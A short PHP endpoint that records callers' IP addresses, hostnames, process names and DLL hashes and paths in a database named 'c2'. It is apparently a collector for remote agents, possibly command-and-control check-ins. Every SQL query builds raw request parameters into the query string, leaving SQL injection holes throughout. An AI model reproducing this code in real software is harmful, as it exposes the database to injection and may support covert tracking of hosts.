
<?php

include 'conf.php';
include 'db.php';

?>


<?php

function ip_exists($i,$h) {	
	$sql = "select * from c2.tbl_ips where ip_address ='" . $i . "' and hostname= '" . $h . "'";
	$result = $GLOBALS["conn"]->query($sql);
	if ($result->num_rows > 0) {
		$row = $result->fetch_assoc();
		return $row["id"];
	}else{
		return "-";
	}
}

function process_exists($i,$n) {	
	$sql = "select * from c2.tbl_ips_process where id_parent_ip ='" . $i . "' and process_name= '" . $n . "'";
	$result = $GLOBALS["conn"]->query($sql);
	if ($result->num_rows > 0) {
		$row = $result->fetch_assoc();
		return $row["id"];
	}else{
		return "-";
	}
}

function dll_exists($i,$h,$i2) {	
	$sql = "select * from c2.tbl_ips_process_dll where id_parent_proc ='" . $i . "' and hash= '" . $h . "' and id_parent_ip = '" . $i2 ."'";
	$result = $GLOBALS["conn"]->query($sql);
	if ($result->num_rows > 0) {
		return TRUE;
	}else{
		return FALSE;
	}
}


if( isset($_REQUEST["hostname"]) ) {
	
	$hostname = $_REQUEST["hostname"];
	$ip = $_SERVER['REMOTE_ADDR'];
	$pname = $_REQUEST["pname"];
	$hash = $_REQUEST['hash'];
	$file_name = $_REQUEST['file_name'];
	
	
	//**************************************************************
	//retrieve first id tbl_ips
	
	if (ip_exists($ip,$hostname)=="-") {
		
		$sql = "INSERT INTO c2.tbl_ips (ip_address,hostname) VALUES ('" . $ip . "','" . $hostname ."')";
		$result = $conn->query($sql);
		if ($result) {
			
			$idip = ip_exists($ip,$hostname);
		
		}else{
			echo "ERR";
			die;
		}
		
	}else{
			$idip = ip_exists($ip,$hostname);
	}
		
	
	//**************************************************************
	//
	// insert process name in tbl_ips_process (add pid and if ended), for only insert and not update
	
	if (process_exists($idip,$pname)=="-") {
		
		$sql = "INSERT INTO c2.tbl_ips_process (id_parent_ip,process_name) VALUES ('" . $idip . "','" . $pname ."')";
		$result = $conn->query($sql);
		if ($result) {
			
			$idip_p = process_exists($idip,$pname);
		
		}else{
			echo "ERR";
			die;
		}
	
	}else{
			$idip_p = process_exists($idip,$pname);
	}
	
	//**************************************************************
	//
	// insert dll
	
	
	if (!dll_exists($idip_p,$hash,$idip)) {
		
		$sql = "INSERT INTO c2.tbl_ips_process_dll (id_parent_proc,dll_path,hash,id_parent_ip) VALUES ('" . $idip_p . "','" . $file_name . "','" . $hash ."','" . $idip . "')";
		$result = $conn->query($sql);
		if ($result) {
			
			echo "OK";
		
		}else{
			echo "ERR";
		}
	
	}else{
			echo "OK";
	}
	
	
	
	
	
	
}

?>